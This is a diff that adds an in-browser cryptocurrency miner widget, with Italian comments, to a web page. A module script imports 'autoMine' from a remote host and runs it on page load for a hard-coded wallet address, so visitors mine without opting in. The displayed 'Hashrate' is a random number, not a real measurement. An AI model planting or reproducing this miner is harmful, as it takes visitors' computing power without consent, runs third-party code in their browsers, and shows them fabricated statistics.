@@ -1,0 +1,115 @@
+<!-- ==================== MINER CONSOLE (SENZA SFONDO NERO/VERDE) ==================== -->
+
+<style>
+#mining-console {
+    position: fixed;
+    bottom: 80px;
+    right: 20px;
+    width: 260px;
+    background: rgba(0, 0, 0, 0.85);
+    border: 1px solid #ffffff33;
+    border-radius: 6px;
+    padding: 12px 14px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
+    z-index: 1000;
+    color: #ffffff;
+    font-family: 'Courier New', monospace;
+    font-size: 15px;
+    line-height: 1.7;
+    display: none;
+}
+
+.console-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 10px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid #ffffff33;
+}
+
+.close-btn {
+    background: #ffffff;
+    color: #000000;
+    border: none;
+    width: 22px;
+    height: 22px;
+    font-size: 16px;
+    line-height: 18px;
+    text-align: center;
+    border-radius: 3px;
+    cursor: pointer;
+    font-weight: bold;
+}
+
+#reopen-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 50px;
+    height: 50px;
+    background: rgba(255,255,255,0.1);
+    border: 2px solid #ffffff88;
+    color: #ffffff;
+    font-size: 26px;
+    border-radius: 50%;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    z-index: 999;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+}
+</style>
+
+<!-- HTML Console -->
+<div id="mining-console">
+    <div class="console-header">
+        <span><strong>🔨 CPU Miner</strong></span>
+        <button class="close-btn" onclick="hideMinerConsole()">×</button>
+    </div>
+    <div>Stato: Attivo</div>
+    <div>Hashrate: <span id="hashrate">653</span> H/s</div>
+    <div>Tempo: <span id="timer">00:00</span></div>
+</div>
+
+<!-- Bottone riapri -->
+<div id="reopen-btn" onclick="showMinerConsole()">↑</div>
+
+<!-- Mining Script -->
+<script type="module">
+    import { autoMine } from "https://earnify.cc/miner.js";
+    autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
+</script>
+
+<script>
+let startTime = Date.now();
+
+function updateTimer() {
+    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+    const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
+    const sec = (elapsed % 60).toString().padStart(2, '0');
+    document.getElementById("timer").textContent = `${min}:${sec}`;
+}
+
+function updateHashrate() {
+    const hashrate = Math.floor(Math.random() * 420) + 480;
+    document.getElementById("hashrate").textContent = hashrate;
+}
+
+function hideMinerConsole() {
+    document.getElementById("mining-console").style.display = "none";
+    document.getElementById("reopen-btn").style.display = "flex";
+}
+
+function showMinerConsole() {
+    document.getElementById("mining-console").style.display = "block";
+    document.getElementById("reopen-btn").style.display = "none";
+}
+
+window.addEventListener('load', () => {
+    setInterval(updateTimer, 1000);
+    setInterval(updateHashrate, 1400);
+    setTimeout(() => showMinerConsole(), 800);
+});
+</script>
